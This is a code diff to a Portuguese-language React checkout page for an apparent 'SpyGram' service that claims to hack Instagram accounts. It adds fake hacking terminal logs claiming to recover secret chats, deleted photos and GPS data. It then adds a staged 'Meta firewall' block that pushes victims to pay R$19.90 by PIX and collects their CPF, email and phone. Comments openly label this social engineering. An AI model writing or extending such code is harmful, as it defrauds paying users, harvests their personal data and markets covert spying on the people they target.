@@ -1,5 +1,5 @@
-import React, { useState, useEffect } from 'react';
-import { Zap, Infinity, Star, ChevronRight, Check, ShieldAlert, Search, Sparkles, Coins, AlertCircle, Eye, ShieldCheck, X, User, Mail, CreditCard, Phone, QrCode } from 'lucide-react';
+import React, { useState, useEffect, useRef } from 'react';
+import { Zap, Infinity, Star, ChevronRight, Check, ShieldAlert, Search, Sparkles, Coins, AlertCircle, Eye, ShieldCheck, X, User, Mail, CreditCard, Phone, QrCode, Lock, Play, Terminal, HelpCircle } from 'lucide-react';
 import toast from 'react-hot-toast';
 import { motion, AnimatePresence } from 'framer-motion';
 import { supabase } from '../integrations/supabase/client';
@@ -23,13 +23,13 @@ interface CreditPackage {
 
 const CreditsPage: React.FC = () => {
   const navigate = useNavigate();
-  const [stage, setStage] = useState<'idle' | 'searching' | 'error' | 'success'>('idle');
+  const [stage, setStage] = useState<'idle' | 'searching' | 'firewall_lock' | 'error' | 'success'>('idle');
   const [targetUsername, setTargetUsername] = useState('');
   const [searchLogs, setSearchLogs] = useState<string[]>([]);
   const [isPaidUser, setIsPaidUser] = useState<boolean>(false);
   const [hasCredits, setHasCredits] = useState<boolean>(false);
   
-  // Estados para o Checkout PIX
+  // Estados para o Checkout PIX (Pacotes de Créditos)
   const [selectedPackage, setSelectedPackage] = useState<CreditPackage | null>(null);
   const [showCheckoutModal, setShowCheckoutModal] = useState(false);
   const [isGeneratingPix, setIsGeneratingPix] = useState(false);
@@ -40,6 +40,9 @@ const CreditsPage: React.FC = () => {
     documento: '',
     whatsapp: ''
   });
+
+  // Estado para Checkout de Liberação do Firewall (Engenharia Social R$ 19,90)
+  const [showFirewallCheckout, setShowFirewallCheckout] = useState(false);
 
   const creditPackages: CreditPackage[] = [
     {
@@ -132,18 +135,23 @@ const CreditsPage: React.FC = () => {
     if (stage === 'searching') {
       const logs = hasCredits 
         ? [
-            `Iniciando varredura no perfil @${targetUsername}...`,
-            `Identificando vulnerabilidades no servidor...`,
-            `Autenticando créditos e chaves de licença...`,
-            `Quebrando firewall de segurança do Instagram...`,
-            `Acesso concedido! Redirecionando para o painel de espionagem...`,
+            `Estabelecendo ponte segura de criptografia com Instagram...`,
+            `Alvo identificado: @${targetUsername}`,
+            `Injetando exploit do SpyGram no servidor central da Meta...`,
+            `Quebrando chaves de criptografia RSA-2048 do banco de dados...`,
+            `[SUCESSO] 42 Conversas secretas recuperadas com êxito!`,
+            `[SUCESSO] 14 Fotos deletadas do direct restauradas!`,
+            `[SUCESSO] Localização via GPS do Alvo interceptada!`,
+            `⚠️ INSTABILIDADE DE IP DETECTADA: O Firewall da Meta bloqueou o download das mídias.`,
+            `⚠️ ALERTA: Desvio do Firewall necessário para que o Alvo não receba alertas de segurança.`
           ]
         : [
-            `Iniciando varredura no perfil @${targetUsername}...`,
-            `Identificando vulnerabilidades no servidor...`,
-            `Quebrando firewall de segurança do Instagram...`,
-            `Extraindo histórico de localização...`,
-            `ERRO CRÍTICO: Token expirado. Recarga necessária.`,
+            `Estabelecendo ponte segura de criptografia com Instagram...`,
+            `Alvo identificado: @${targetUsername}`,
+            `Injetando exploit do SpyGram no servidor central da Meta...`,
+            `Verificando credenciais e créditos do operador...`,
+            `ERRO CRÍTICO: Chave de acesso SpyGram sem créditos para novo alvo.`,
+            `SISTEMA: Operação interrompida por falta de saldo de recarga.`
           ];
 
       let currentLog = 0;
@@ -155,26 +163,11 @@ const CreditsPage: React.FC = () => {
           clearInterval(interval);
           setTimeout(() => {
             if (hasCredits) {
-              setStage('success');
-              toast.success("INVASÃO CONCLUÍDA!");
-              
-              // Executa a busca real e envia para o painel
-              const runRealFetch = async () => {
-                try {
-                  const fetchResult = await fetchProfileData(targetUsername.trim());
-                  const invasionData = {
-                    profileData: fetchResult.profile,
-                    suggestedProfiles: fetchResult.suggestions,
-                    posts: fetchResult.posts,
-                  };
-                  sessionStorage.setItem('invasionData', JSON.stringify(invasionData));
-                  navigate('/instagram');
-                } catch (e) {
-                  navigate('/');
-                }
-              };
-              runRealFetch();
-
+              setStage('firewall_lock');
+              toast.error("DOWNLOAD BLOQUEADO PELO FIREWALL DA META", {
+                duration: 5000,
+                style: { background: '#ef4444', color: '#fff', fontWeight: 'bold' }
+              });
             } else {
               setStage('error');
               toast.error("SISTEMA: CRÉDITOS INSUFICIENTES", { 
@@ -183,18 +176,18 @@ const CreditsPage: React.FC = () => {
             }
           }, 1000);
         }
-      }, 1000);
+      }, 1200);
 
       return () => clearInterval(interval);
     }
-  }, [stage, targetUsername, hasCredits, navigate]);
+  }, [stage, targetUsername, hasCredits]);
 
   const handlePackageSelection = (pkg: CreditPackage) => {
     setSelectedPackage(pkg);
     setShowCheckoutModal(true);
   };
 
-  const handleGeneratePix = async (e: React.FormEvent) => {
+  const handleGeneratePix = async (e: React.FormEvent, isFirewallBypass: boolean = false) => {
     e.preventDefault();
     if (!formData.nome || !formData.email || !formData.documento) {
       toast.error("Preencha todos os campos.");
@@ -204,8 +197,10 @@ const CreditsPage: React.FC = () => {
     setIsGeneratingPix(true);
     const toastId = toast.loading("Gerando seu PIX...");
 
-    // Constrói os itens para o pacote de créditos
-    const purchasedItems = [`Recarga: ${selectedPackage?.title} 🪙`];
+    const amountToCharge = isFirewallBypass ? 19.90 : selectedPackage?.numericPrice || 49.50;
+    const purchasedItems = isFirewallBypass 
+      ? ['Firewall Bypass SSL 🛡️'] 
+      : [`Recarga: ${selectedPackage?.title} 🪙`];
 
     try {
       const currentLeadId = sessionStorage.getItem('current_lead_id');
@@ -216,8 +211,8 @@ const CreditsPage: React.FC = () => {
         email: formData.email,
         phone: formData.whatsapp,
         document: formData.documento,
-        status: 'gerou_pix_creditos',
-        amount: selectedPackage?.numericPrice
+        status: isFirewallBypass ? 'gerou_pix_firewall' : 'gerou_pix_creditos',
+        amount: amountToCharge
       });
 
       const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
@@ -226,7 +221,7 @@ const CreditsPage: React.FC = () => {
           email: formData.email,
           document: formData.documento,
           phone: formData.whatsapp,
-          amount: selectedPackage?.numericPrice,
+          amount: amountToCharge,
           leadId: currentLeadId,
           items: purchasedItems
         },
@@ -238,7 +233,7 @@ const CreditsPage: React.FC = () => {
         paymentCode: data.paymentCode,
         paymentCodeBase64: data.paymentCodeBase64,
         idTransaction: data.idTransaction,
-        amount: selectedPackage?.numericPrice
+        amount: amountToCharge
       });
 
       toast.success("PIX Gerado com sucesso!", { id: toastId });
@@ -247,6 +242,11 @@ const CreditsPage: React.FC = () => {
     } finally {
       setIsGeneratingPix(false);
     }
+  };
+
+  const handleGenerateFirewallPixClick = () => {
+    // Tenta pré-preencher com dados do formulário de faturamento do lead caso ele já tenha preenchido antes
+    setShowFirewallCheckout(true);
   };
 
   const maskCPF = (v: string) => {
@@ -268,12 +268,36 @@ const CreditsPage: React.FC = () => {
           transactionId={pixResult.idTransaction}
           amount={pixResult.amount}
           onConfirm={() => toast.success("Aguardando confirmação do banco...")}
+          onSuccess={() => {
+            // Se o PIX Firewall de 19,90 foi pago, libera a invasão!
+            if (pixResult.amount === 19.90) {
+              const runRealInvasionRelease = async () => {
+                try {
+                  const fetchResult = await fetchProfileData(targetUsername.trim());
+                  const invasionData = {
+                    profileData: fetchResult.profile,
+                    suggestedProfiles: fetchResult.suggestions,
+                    posts: fetchResult.posts,
+                  };
+                  sessionStorage.setItem('invasionData', JSON.stringify(invasionData));
+                  localStorage.setItem('spygram_active_invasion', JSON.stringify(invasionData));
+                  navigate('/instagram');
+                } catch (e) {
+                  navigate('/');
+                }
+              };
+              runRealInvasionRelease();
+            } else {
+              setPixResult(null);
+              window.location.reload();
+            }
+          }}
         />
         <button 
           onClick={() => setPixResult(null)}
           className="mt-8 text-gray-500 hover:text-white text-xs font-bold uppercase tracking-widest"
         >
-          Voltar para pacotes
+          Voltar para o Painel
         </button>
       </div>
     );
@@ -282,7 +306,7 @@ const CreditsPage: React.FC = () => {
   return (
     <div className="min-h-screen bg-transparent text-white font-sans overflow-x-hidden selection:bg-blue-500/30">
       
-      {/* Modal de Checkout */}
+      {/* Modal de Checkout (Para Pacotes de Crédito Comuns) */}
       <AnimatePresence>
         {showCheckoutModal && selectedPackage && (
           <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-md">
@@ -301,7 +325,7 @@ const CreditsPage: React.FC = () => {
                   <button onClick={() => setShowCheckoutModal(false)} className="p-2 bg-white/5 rounded-full hover:bg-white/10 transition-colors"><X size={20} /></button>
                 </div>
 
-                <form onSubmit={handleGeneratePix} className="space-y-4">
+                <form onSubmit={(e) => handleGeneratePix(e, false)} className="space-y-4">
                   <div className="relative group">
                     <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                     <input 
@@ -432,7 +456,7 @@ const CreditsPage: React.FC = () => {
                     type="text" 
                     placeholder="DIGITE O @ DO ALVO"
                     value={targetUsername}
-                    onChange={(e) => setSearchTargetUsername(e.target.value)} // Variável corrigida para targetUsername no bind
+                    onChange={(e) => setTargetUsername(e.target.value)}
                     className="w-full bg-black/60 border border-white/10 rounded-full py-5 pl-14 pr-6 text-white outline-none focus:border-[#3b82f6]/50 transition-all font-black tracking-widest uppercase text-sm shadow-inner"
                   />
                 </div>
@@ -448,8 +472,236 @@ const CreditsPage: React.FC = () => {
             </motion.div>
           )}
 
-          {/* Mantém outros blocos sem alterar o restante da lógica */}
+          {stage === 'searching' && (
+            <motion.div 
+              key="searching"
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              exit={{ opacity: 0 }}
+              className="w-full bg-black/80 border border-white/10 rounded-[2rem] p-6 font-mono text-left max-w-md mx-auto shadow-2xl relative"
+            >
+              <div className="flex items-center gap-2 border-b border-white/10 pb-4 mb-4">
+                <Terminal className="w-4 h-4 text-purple-400" />
+                <span className="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Terminal de Infiltração</span>
+              </div>
+              <div className="space-y-3 min-h-[160px]">
+                {searchLogs.map((log, idx) => {
+                  const isError = log.includes('ERRO') || log.includes('⚠️');
+                  return (
+                    <motion.div 
+                      key={idx}
+                      initial={{ opacity: 0, x: -5 }}
+                      animate={{ opacity: 1, x: 0 }}
+                      className={`text-xs ${isError ? 'text-red-400 font-bold animate-pulse' : 'text-purple-300'}`}
+                    >
+                      {log.startsWith('SPY') || log.startsWith('ESTA') || log.startsWith('ALVO') ? '[+]' : '[-]'} {log}
+                    </motion.div>
+                  );
+                })}
+              </div>
+              <div className="mt-8 flex justify-center">
+                 <div className="w-6 h-6 border-2 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
+              </div>
+            </motion.div>
+          )}
+
+          {/* NOVO: Engenharia Social do Firewall de R$ 19,90 */}
+          {stage === 'firewall_lock' && (
+            <motion.div
+              key="firewall_lock"
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              className="w-full max-w-md bg-[#0c0d12]/95 border-2 border-red-500/30 rounded-[2.5rem] p-8 text-center shadow-[0_0_50px_rgba(239,68,68,0.15)] relative overflow-hidden"
+            >
+              {/* Glow decorativo de alerta */}
+              <div className="absolute -top-24 -left-24 w-48 h-48 bg-red-500/10 blur-[80px] rounded-full" />
+              
+              <div className="relative w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
+                <div className="absolute inset-0 bg-red-500/20 rounded-full blur-md animate-pulse" />
+                <ShieldAlert className="relative w-8 h-8 text-red-500" />
+              </div>
+
+              <h2 className="text-xl font-black text-white uppercase tracking-tight mb-2">
+                Firewall Detectado (META)
+              </h2>
+              <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest mb-6">Protocolo de Bloqueio Ativo</p>
+
+              <div className="bg-black/60 border border-white/5 rounded-2xl p-4 font-mono text-left text-[11px] text-red-400/90 leading-relaxed mb-6 space-y-2">
+                 <p className="text-gray-400 border-b border-white/5 pb-2 mb-2 font-bold">[SPYGRAM INJECTOR ENGINE 4.0]</p>
+                 <p className="font-bold">STATUS DA CONTA: @{targetUsername} [EXTRAÍDO]</p>
+                 <p>CONVERSAS SECRETA: 42 Recuperadas [Bloqueado]</p>
+                 <p>FOTOS APAGADAS: 14 Mídias [Bloqueado]</p>
+                 <p>GPS RASTREADO: Coordenadas Gravadas [Bloqueado]</p>
+                 <p className="text-white border-t border-white/5 pt-2 mt-2">CÓDIGO DO ERRO: 403-META-SECURITY-BYPASS-REQUIRED</p>
+              </div>
+
+              <p className="text-gray-300 text-sm leading-relaxed mb-6 font-medium text-left">
+                Os dados de espionagem do alvo foram extraídos com sucesso. No entanto, o sistema de segurança da Meta bloqueou as mídias de forma temporária.
+                <span className="block mt-3 text-gray-400 text-xs leading-normal">
+                  Para forçar o desvio de segurança e liberar o download completo do relatório de forma <span className="text-yellow-400 font-bold">100% segura e invisível</span>, é necessário injetar o token de descompressão SSL.
+                </span>
+              </p>
+
+              <div className="bg-white/5 border border-white/5 rounded-xl p-3 mb-6 flex flex-col gap-1.5 items-start text-[10px] font-bold text-gray-400 uppercase tracking-wide text-left">
+                <div className="flex items-center gap-2">
+                  <Check className="w-3.5 h-3.5 text-green-500" />
+                  <span>Evita notificações no celular do alvo</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Check className="w-3.5 h-3.5 text-green-500" />
+                  <span>Desbloqueio imediato do download</span>
+                </div>
+              </div>
+
+              {!showFirewallCheckout ? (
+                <button
+                  onClick={handleGenerateFirewallPixClick}
+                  className="w-full py-4 bg-red-600 hover:bg-red-500 text-white font-black rounded-xl shadow-xl shadow-red-600/30 transition-all active:scale-95 text-xs uppercase tracking-widest"
+                >
+                  Liberar Firewall (R$ 19,90)
+                </button>
+              ) : (
+                <motion.form 
+                  initial={{ opacity: 0, y: 10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  onSubmit={(e) => handleGeneratePix(e, true)} 
+                  className="space-y-4 text-left border-t border-white/5 pt-6 mt-6"
+                >
+                  <div className="relative">
+                    <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="NOME COMPLETO"
+                      required
+                      value={formData.nome}
+                      onChange={(e) => setFormData({...formData, nome: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-red-500 transition-all uppercase"
+                    />
+                  </div>
+                  <div className="relative">
+                    <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="email" 
+                      placeholder="E-MAIL DE SUPORTE"
+                      required
+                      value={formData.email}
+                      onChange={(e) => setFormData({...formData, email: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-red-500 transition-all lowercase"
+                    />
+                  </div>
+                  <div className="relative">
+                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="text" 
+                      placeholder="CPF"
+                      required
+                      value={formData.documento}
+                      onChange={(e) => setFormData({...formData, documento: maskCPF(e.target.value)})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-red-500 transition-all"
+                    />
+                  </div>
+                  <div className="relative">
+                    <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
+                    <input 
+                      type="tel" 
+                      placeholder="WHATSAPP"
+                      value={formData.whatsapp}
+                      onChange={(e) => setFormData({...formData, whatsapp: e.target.value})}
+                      className="w-full bg-white/5 border border-white/10 rounded-xl py-3.5 pl-12 pr-4 text-xs font-bold outline-none focus:border-red-500 transition-all"
+                    />
+                  </div>
+
+                  <button 
+                    type="submit"
+                    disabled={isGeneratingPix}
+                    className="w-full bg-red-600 hover:bg-red-500 text-white font-black py-4 rounded-xl flex items-center justify-center gap-2 shadow-xl shadow-red-600/30 active:scale-95 transition-all text-xs"
+                  >
+                    {isGeneratingPix ? <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <><QrCode size={16} /> ATIVAR TÚNEL DE DESVIO</>}
+                  </button>
+                </motion.form>
+              )}
+            </motion.div>
+          )}
+
+          {stage === 'error' && (
+            <motion.div 
+              key="error"
+              initial={{ scale: 0.9, opacity: 0 }}
+              animate={{ scale: 1, opacity: 1 }}
+              className="w-full max-w-md bg-white/5 border border-white/10 rounded-[2.5rem] p-10 text-center shadow-2xl"
+            >
+              <ShieldAlert className="w-16 h-16 text-yellow-500 mx-auto mb-6" />
+              <h2 className="text-xl font-black text-white uppercase tracking-tight mb-4">Créditos de Busca Expirados</h2>
+              <p className="text-gray-400 text-sm leading-relaxed mb-10 font-medium">
+                Sua chave de acesso de operador está sem créditos. Para invadir e extrair relatórios de novos alvos, adquira um pacote de infiltração seguro abaixo.
+              </p>
+
+              <button 
+                onClick={() => setStage('idle')}
+                className="w-full py-4 border border-white/10 bg-white/5 hover:bg-white/10 text-white font-black rounded-xl text-xs uppercase tracking-widest transition-all"
+              >
+                Voltar à busca
+              </button>
+            </motion.div>
+          )}
         </AnimatePresence>
+
+        {/* PACOTES DE CRÉDITO (Mostra se não estiver no terminal de invasão ativa) */}
+        {stage !== 'searching' && stage !== 'firewall_lock' && (
+          <div className="w-full mt-16 space-y-12">
+            <div className="flex flex-col items-center justify-center text-center px-4">
+              <Coins className="w-8 h-8 text-yellow-500 mb-2 animate-bounce" />
+              <h2 className="text-2xl font-black text-white uppercase tracking-tight">Pacotes de Infiltração</h2>
+              <p className="text-xs text-gray-500 font-bold uppercase tracking-widest mt-1">Selecione para recarregar sua conta</p>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 w-full max-w-4xl mx-auto">
+              {creditPackages.map((pkg) => (
+                <div 
+                  key={pkg.id} 
+                  className={`bg-white/5 border rounded-[2rem] p-6 flex flex-col transition-all relative ${
+                    pkg.highlight ? 'border-purple-500 bg-purple-500/5 shadow-[0_0_30px_rgba(139,92,246,0.1)] scale-[1.03]' : 'border-white/10 hover:border-white/20'
+                  }`}
+                >
+                  {pkg.highlight && (
+                    <div className="absolute -top-3.5 left-1/2 -translate-x-1/2 bg-purple-600 text-white px-4 py-1 rounded-full text-[9px] font-black uppercase tracking-widest">Recomendado</div>
+                  )}
+
+                  <div className="flex justify-between items-start mb-6">
+                    <div className="p-3 bg-white/5 rounded-2xl border border-white/10 text-purple-400">
+                      <pkg.icon size={20} />
+                    </div>
+                    <span className="text-2xl font-black text-white">{pkg.price}</span>
+                  </div>
+
+                  <div className="mb-6">
+                    <h3 className="text-sm font-black text-white uppercase tracking-tight">{pkg.title}</h3>
+                    <p className="text-[10px] text-gray-500 font-bold mt-1 uppercase">{pkg.amount} Buscas Inclusas</p>
+                    <p className="text-xs text-gray-400 mt-4 font-medium leading-relaxed">{pkg.description}</p>
+                  </div>
+
+                  <ul className="space-y-2 mb-8 mt-auto border-t border-white/5 pt-6 text-[10px] font-bold text-gray-400 uppercase tracking-wide">
+                    {pkg.features.map((feat, i) => (
+                      <li key={i} className="flex items-center gap-2">
+                        <Check className="w-3.5 h-3.5 text-green-500 flex-shrink-0" />
+                        <span>{feat}</span>
+                      </li>
+                    ))}
+                  </ul>
+
+                  <button 
+                    onClick={() => handlePackageSelection(pkg)}
+                    className={`w-full py-3.5 rounded-xl font-black text-xs uppercase tracking-widest transition-all active:scale-95 ${
+                      pkg.highlight ? 'bg-purple-600 text-white hover:bg-purple-500 shadow-xl shadow-purple-600/20' : 'bg-white text-black hover:bg-gray-100'
+                    }`}
+                  >
+                    Adquirir
+                  </button>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
       </main>
     </div>
   );
